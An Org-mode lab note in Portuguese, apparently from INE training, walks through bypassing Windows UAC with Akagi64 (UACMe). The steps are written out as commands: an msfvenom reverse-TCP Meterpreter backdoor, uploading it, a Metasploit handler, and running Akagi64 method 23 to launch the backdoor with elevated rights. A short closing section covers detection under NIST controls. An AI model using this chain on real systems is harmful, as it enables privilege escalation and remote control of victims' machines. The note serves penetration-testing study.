#+title: Bypassing Uac With Uac Me
#+author: gabriel

* üõ°Ô∏è Intro to UAC Bypass (INE Methodology)
Este documento descreve o processo de escala√ß√£o de privil√©gios contornando o User Account Control (UAC) utilizando a ferramenta **UACMe** (Akagi64) em conjunto com um backdoor gerado pelo **MSFVenom**.

** Prerequisites
- Uma sess√£o inicial do Meterpreter (Low/Medium Integrity).
- Usu√°rio alvo deve pertencer ao grupo de *Administradores*.
- Ferramenta Akagi64.exe e o payload gerado.

* üöÄ Step 1: Payload Generation (MSFVenom)
Primeiro, criamos o execut√°vel que servir√° como nosso "backdoor" para receber a conex√£o elevada.

#+BEGIN_SRC bash
# Gerando o execut√°vel de shell reversa
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<SUA_IP> LPORT=4444 -f exe -o backdoor.exe
#+END_SRC

* üì• Step 2: Upload via Meterpreter
Com a sess√£o inicial ativa, enviamos os arquivos necess√°rios para o sistema alvo (geralmente para =C:\Windows\Temp= ou uma pasta com permiss√£o de escrita).

#+BEGIN_SRC msf
# No console do Meterpreter
cd C:\\Users\\Public\\Downloads
upload /path/to/Akagi64.exe .
upload /path/to/backdoor.exe .
#+END_SRC

* ‚ö° Step 3: Setting up the Handler
Antes de executar o bypass, precisamos deixar o Metasploit ouvindo para receber a nova conex√£o (que vir√° com privil√©gios altos).

#+BEGIN_SRC msf
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <SUA_IP>
set LPORT 4444
run -j
#+END_SRC

* üèóÔ∏è Step 4: Executing UACMe (Akagi64)
Agora, utilizamos o Akagi para executar o nosso `backdoor.exe` abusando de um m√©todo de bypass. No treinamento da INE, o Akagi utiliza o backdoor como o processo a ser elevado.

#+BEGIN_SRC msf
# Entre no shell do Windows via Meterpreter
shell

# Execute o Akagi64 passando o m√©todo e o caminho do seu backdoor
# Exemplo usando o m√©todo 23 (ou o recomendado no laborat√≥rio)
Akagi64.exe 23 C:\Users\Public\Downloads\backdoor.exe
#+END_SRC

** üèÅ Outcome
Se o bypass for bem-sucedido, uma nova sess√£o do Meterpreter ser√° aberta no seu Handler.
- Use =getsystem= ou verifique com =getprivs=.
- O comando =whoami /groups= deve agora mostrar que o processo est√° em *High Integrity*.

* ‚öñÔ∏è GRC & Audit Perspective (NIST SP 800-53)
Como analista de seguran√ßa, a detec√ß√£o deste fluxo √© cr√≠tica:

** System and Information Integrity (SI-4)
- *Monitoramento:* O uso de ferramentas como o Akagi64 deve ser detectado por solu√ß√µes de EDR atrav√©s de monitoramento comportamental (ex: inje√ß√£o de DLL em processos como =sysprep.exe= ou =cliconfg.exe=).

** Audit and Accountability (AU-6)
- *An√°lise de Logs:* Auditorias devem verificar logs de cria√ß√£o de processos. A execu√ß√£o de execut√°veis a partir de diret√≥rios tempor√°rios (=Temp=, =Downloads=) por processos que realizam auto-eleva√ß√£o √© um indicador de comprometimento (IoC).

* üí° Pro-Tip (Emacs/Org-mode)
Voc√™ pode usar o atalho `C-c C-c` em blocos de c√≥digo no Org-mode para organizar suas notas de laborat√≥rio enquanto assiste √†s aulas da INE.


